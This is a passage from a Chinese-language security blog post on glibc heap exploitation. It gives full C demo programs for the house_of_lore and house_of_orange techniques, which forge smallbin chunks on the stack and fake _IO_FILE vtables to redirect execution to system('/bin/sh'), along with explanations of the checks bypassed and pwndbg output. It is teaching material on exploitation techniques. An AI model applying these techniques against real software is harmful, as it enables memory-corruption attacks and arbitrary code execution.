  fprintf(stderr, &quot;stack_buffer_1 at %p\n&quot;, (void*)stack_buffer_1);
  fprintf(stderr, &quot;stack_buffer_2 at %p\n&quot;, (void*)stack_buffer_2);

  fprintf(stderr, &quot;Create a fake chunk on the stack\n&quot;);
  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;
         &quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;);
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;
         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;
         &quot;chunk on stack&quot;);
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;
         &quot;the small one during the free()\n&quot;);
  void *p5 = malloc(1000);
  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\n&quot;, p5);


  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);
  free((void*)victim);

  fprintf(stderr, &quot;\nIn the unsorted bin the victim&#39;s fwd and bk pointers are nil\n&quot;);
  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

  fprintf(stderr, &quot;Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin\n&quot;);
  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;, victim);

  void *p2 = malloc(1200);
  fprintf(stderr, &quot;The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;, p2);

  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;);
  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);
  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;);

  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack

  //------------------------------------

  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\n&quot;);
  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;);

  void *p3 = malloc(100);


  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;);
  char *p4 = malloc(100);
  fprintf(stderr, &quot;p4 = malloc(100)\n&quot;);

  fprintf(stderr, &quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;,
         stack_buffer_2[2]);

  fprintf(stderr, &quot;\np4 is %p and should be on the stack!\n&quot;, p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
</code></pre>
<p>house_of_lore利用了small bins的分配机制，可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
<p>相关代码:</p>
<pre><code class="c">else
    {
      bck = victim-&gt;bk;
            if (__glibc_unlikely (bck-&gt;fd != victim)){

                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin-&gt;bk = bck;
       bck-&gt;fd = bin;
</code></pre>
<p>可以发现它只检查了bck-fd 是否等于victIm，但是没检查bck。所以可以伪造fake_chunk，使victIm-&gt;bk = fake_chunk，当victim被分配时，fake_chunk就会被链入small bins中，但是为了能成功返回fake_chunk，还要伪造一个chunk，使fake_chunk能通过<em>__glibc_unlikely (bck-&gt;fd != victim)</em> 检查</p>
<p>所以在这个例子中，它伪造了两个fake_chunk</p>
<pre><code>fake_chunk1
fd = victim
bk = fake_chunk2
---------
fake_chunk2
fd = fake_chunk1
</code></pre><p>调试一下：</p>
<p>victim被加入small bins 时</p>
<pre><code>pwndbg&gt; p victim
$2 = (intptr_t *) 0x603010
pwndbg&gt; smallbins 
smallbins
0x70: 0x7ffff7dd1bd8 (main_arena+184) —▸ 0x603000 ◂— 0x7ffff7dd1bd8
pwndbg&gt; parseheap 
addr        prev      size         status          fd                bk     
0x603000    0x0       0x70         Freed        0x7ffff7dd1bd8    0x7ffff7dd1bd8
0x603070    0x70      0x3f0         Used           None              None
0x603460    0x0       0x4c0         Used           None              None
</code></pre><p>将stack_chunk_1地址写入 victim-&gt;bk</p>
<p><img src="/picture/1552145129640.png" srcset="/img/loading.gif" alt="1552145129640"></p>
<p>victim被分配后，stack_chunk_1被链入small_bins中，再分配对应大小的chunk，就可以分配到stack_chunk_1了，就可以修改栈上的内容，比如返回地址什么的，控制程序的执行流。</p>
<p>输出结果：</p>
<p><img src="/picture/1552145537122.png" srcset="/img/loading.gif" alt="1552145537122"></p>
<h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h4><p>源码：(它注释太多了，我把它都删了，不过它注释把原理都讲的挺明白了)</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int winner ( char *ptr);

int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, &quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;
        &quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;);

    fprintf(stderr, &quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;
        &quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;);

    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    p2 = malloc(0x1000);


    top[3] = io_list_all - 0x10;

    memcpy( ( char *) top, &quot;/bin/sh\x00&quot;, 8);

    top[1] = 0x61;

    _IO_FILE *fp = (_IO_FILE *) top;

    fp-&gt;_mode = 0; // top+0xc0

    fp-&gt;_IO_write_base = (char *) 2; // top+0x20
    fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28


    size_t *jump_table = &amp;top[12]; // controlled memory
    jump_table[3] = (size_t) &amp;winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8


    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc&#39;s error message will be printed to the screen
     But you&#39;ll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    return 0;
}
</code></pre>
<p>house_of_orange是一种 堆溢出和IO_FILE利用结合的攻击手法。最主要的特点是它没有free的功能，它需要通过漏洞来达到free的效果。</p>
<p>前提条件：</p>
<ol>
<li>存在堆溢出，可以控制top_chunk的size字段</li>
<li>存在信息泄露，能泄露出堆的地址</li>
<li>libc版本小于等于2.3</li>
</ol>
<p>简单讲下house_of_orange的流程。</p>
<p>首先，通过堆溢出修改top_chunk的size字段，使top_chunk的size减小。然后，malloc一个比top_chunk大的的chunk，就会通过sysmalloc申请一个新的top_chunk，旧的top_chunk就会被free掉，加入unsorted bin中。然后通过unsorted bin attack往_IO_list_all 中写入main_aren + 88，此时 _IO_list_all中的 *chain指针位于 _IO_list_all + 0x68的位置，也就是 main_arena + 0x58 + 0x68–&gt;small bin中大小为0x60的位置，所以将之前的old top chunk的size修改为0x61，old top chunk就会链入small bin中，这时就可以将伪造的fake_file链入IO_all_list中,将fake_file的vtable指向伪造的IO_jump_t结构的地址，在伪造的 IO_jump_t 结构体中，在overflow函数处写入system函数，则最终会调用system函数。</p>
<p>几个要注意的点：</p>
<ol>
<li><p>top_chunk的size字段修改要页对齐，不能随便修改，同时prev_inuse位必须为1</p>
</li>
<li><p>伪造的IO_File结构体 要过几个检查</p>
<pre><code class="c"> 1.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)

 或者是
 2.
 _IO_vtable_offset (fp) == 0 
 &amp;&amp; fp-&gt;_mode &gt; 0 
 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)
</code></pre>
<p> 查看伪造的_IO_FILE结构体 和vtable</p>
<pre><code> pwndbg&gt; p *((struct _IO_FILE_plus *)0x602400)
 $3 = {
   file = {
     _flags = 0x6e69622f, 
     _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, 
     _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;\020@b&quot;, 
     _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, 
     _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;, 
     _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;, 
     _IO_write_end = 0x0, 
     _IO_buf_base = 0x0, 
     _IO_buf_end = 0x0, 
     _IO_save_base = 0x0, 
     _IO_backup_base = 0x0, 
     _IO_save_end = 0x0, 
     _markers = 0x0, 
     _chain = 0x0, 
     _fileno = 0x0, 
     _flags2 = 0x0, 
     _old_offset = 0x40078f, 
     _cur_column = 0x0, 
     _vtable_offset = 0x0, 
     _shortbuf = &quot;&quot;, 
     _lock = 0x0, 
     _offset = 0x0, 
     _codecvt = 0x0, 
     _wide_data = 0x0, 
     _freeres_list = 0x0, 
     _freeres_buf = 0x0, 
     __pad5 = 0x0, 
     _mode = 0x0, 
     _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;
   }, 
   vtable = 0x602460
 }
 pwndbg&gt; p *((struct _IO_FILE_plus *)0x602400).vtable
 $4 = {
   __dummy = 0x0, 
   __dummy2 = 0x0, 
   __finish = 0x0, 
   __overflow = 0x40078f &lt;winner&gt;, 
   __underflow = 0x0, 
   __uflow = 0x0, 
   __pbackfail = 0x0, 
   __xsputn = 0x0, 
   __xsgetn = 0x0, 
   __seekoff = 0x0, 
   __seekpos = 0x0, 
   __setbuf = 0x0, 
   __sync = 0x0, 
   __doallocate = 0x0, 
   __read = 0x0, 
   __write = 0x602460, 
   __seek = 0x0, 
   __close = 0x0, 
   __stat = 0x0, 
   __showmanyc = 0x0, 
   __imbue = 0x0
 }
</code></pre></li>
</ol>
<p>最终结果：</p>
<p><img src="/picture/1552384119963.png" srcset="/img/loading.gif" alt="1552384119963"></p>

            </div>
            <hr>
            <div>
              <p>
                
                  <span>
                <i class="iconfont icon-inbox"></i>
                    
                      <a class="hover-with-bg" href="/categories/Heap-Exploitation/">Heap_Exploitation</a>
                      &nbsp;
                    
                  </span>&nbsp;&nbsp;
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                    
                      <a class="hover-with-bg" href="/tags/houseofxxx/">houseofxxx</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
            </div>

            
              <!-- Comments -->
              <div class="comments" id="comments">
                
                
  <script defer src="https://utteranc.es/client.js" repo="zszcr/comment" issue-term="pathname" label="utterances" theme="github-light" crossorigin="anonymous" async>
  </script>


              </div>
            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var post = $('#post');
      var toc = $('#toc');
      var tocLimMax = post.offset().top + post.height() - navHeight;

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = $('#board-ctn').css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->


  

  
    <!-- Google Analytics -->
    <script defer>
      (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
          (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
          m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

      ga('create', 'UA-160202176-1', 'auto');
      ga('send', 'pageview');
    </script>
  

  

  

  



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "堆利用的一些总结&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
